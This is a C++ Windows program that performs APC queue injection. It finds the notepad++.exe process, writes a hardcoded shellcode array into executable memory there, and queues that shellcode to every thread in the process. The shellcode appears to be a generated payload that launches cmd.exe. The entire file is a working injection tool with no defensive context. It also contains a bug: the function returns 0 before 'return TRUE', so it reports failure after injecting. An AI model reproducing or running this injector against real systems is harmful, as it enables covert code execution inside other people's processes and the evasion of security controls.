#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>

#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__);
#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__);
#define fail(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__);
#define warn(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__);

const wchar_t* target_exe = L"notepad++.exe";
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";


BOOL APCqCallInjection()
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	HANDLE hProcess = NULL;
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	SIZE_T shellSize = sizeof(shellcode);
	HANDLE threadHandle = NULL;

	/* get target process id */
	info("Looking for target process: %ls", target_exe);
	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, target_exe) != 0) {
			Process32Next(snapshot, &processEntry);
		}
	}
	else {
		fail("Failed to find target process");
		return FALSE;
	}
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (hProcess == NULL) {
		fail("Failed to open target process");
		return FALSE;
	}
	okay("Found target process: %s (PID: %d)", processEntry.szExeFile, processEntry.th32ProcessID);

	/* allocate memory in target process */
	info("Allocating memory in target process for shellcode");
	LPVOID shellAddress = VirtualAllocEx(hProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellAddress == NULL) {
		fail("Failed to allocate memory in target process");
		return FALSE;
	}
	okay("Allocated memory in target process at 0x%p", shellAddress);

	/* write shellcode to target process */
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	if (!WriteProcessMemory(hProcess, shellAddress, shellcode, shellSize, NULL)) {
		fail("Failed to write shellcode to target process");
		return FALSE;
	}
	okay("Wrote shellcode to target process");

	/* enumerate threads in target process and queue APC */
	info("Enumerating threads in target process");
	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}
	else {
		fail("Failed to enumerate threads in target process");
		return FALSE;
	}
	if (threadIds.empty()) {
		fail("No threads found in target process");
		return FALSE;
	}
	okay("Found %d threads in target process", threadIds.size());

	/* queue APC to threads */
	info("Queueing APC to threads in target process");
	for (DWORD threadId : threadIds) {
		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		Sleep(1000 * 2);
	}
	okay("Queued APC to threads in target process");

	return 0;
	return TRUE;
}

int main(int argc, char** argv)
{
	if (!APCqCallInjection())
	{
		fail("Failed to inject shellcode to target");
		return EXIT_FAILURE;
	}
	okay("Successfully injected shellcode to target");

	return EXIT_SUCCESS;
}
